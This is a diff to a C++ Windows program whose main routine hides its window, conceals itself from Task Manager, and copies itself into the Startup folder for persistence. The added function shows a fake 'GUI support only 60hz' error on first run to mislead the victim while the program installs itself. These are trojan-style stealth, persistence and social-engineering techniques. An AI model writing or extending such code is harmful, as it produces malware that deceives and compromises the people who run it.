@@ -8,6 +8,7 @@
 #include <shlwapi.h>
 #include <Mmsystem.h>
 #include <mciapi.h>
+#include <fstream>
 #pragma comment(lib, "Winmm.lib")
 #pragma comment (lib, "urlmon.lib")
 #pragma comment(lib, "ntdll.lib")
@@ -129,10 +130,21 @@ void autorun()
     fs::create_directories(targetParent);
     fs::copy_file(sourceFile, target, fs::copy_options::overwrite_existing);
 }
+void mbox()
+{
+    std::fstream fileStream;
+    fs::path sourceFile = exename();
+    std::string tocheck = "C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/" + exename();
+    fileStream.open(tocheck);
+    if (fileStream.fail()) {
+        MessageBox(0, "Error", "GUI support only 60hz", MB_OK);
+    }
+}
 int main()
 {
     Hide();
     hidefromtaskmanager();
+    mbox();
     autorun();
     srand(time(NULL));
     Sleep(210000);
